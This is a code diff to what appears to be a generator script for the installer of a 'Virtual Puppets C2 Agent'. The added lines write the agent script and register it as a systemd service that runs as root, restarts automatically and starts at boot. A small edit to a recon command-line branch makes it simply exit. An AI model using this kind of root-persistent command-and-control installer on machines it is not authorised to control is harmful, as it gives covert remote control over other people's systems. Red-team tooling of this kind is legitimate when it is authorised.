@@ -97,9 +97,10 @@ elif [ "$1" == "--recon" ]; then
     # Force recon via CLI (load ID manually)
     if [ -f "$AGENT_DIR/vpp-id" ]; then
         ACTOR_ID=$(cat "$AGENT_DIR/vpp-id")
-        # Source the function below by continuing execution? 
-        # Easier to just let main loop handle it, but for simplicity we duplicate call here or shift logic structure.
-        # Ideally functions are defined before usage.
+        # Perform recon will be called in main loop if flag is set, but here we can't easily access the function unless we source it
+        # For simplicity, we just exit, as the agent service handles recon.
+        echo "Recon is handled by the main service loop."
+        exit 0
     else
         echo "Agent not enrolled."
         exit 1
@@ -384,3 +385,29 @@ while true; do
 
     sleep 5
 done
+EOF_SRV
+chmod +x $AGENT_DIR/agent.sh
+
+# Install Systemd Service
+cat <<EOF > /etc/systemd/system/vpp-agent.service
+[Unit]
+Description=Virtual Puppets C2 Agent
+After=network.target
+
+[Service]
+ExecStart=$AGENT_DIR/agent.sh
+Restart=always
+User=root
+WorkingDirectory=$AGENT_DIR
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload
+systemctl enable vpp-agent
+systemctl restart vpp-agent
+
+echo "[$(date)] [INSTALLER] Agent Installed and Started successfully."
+`;
+};
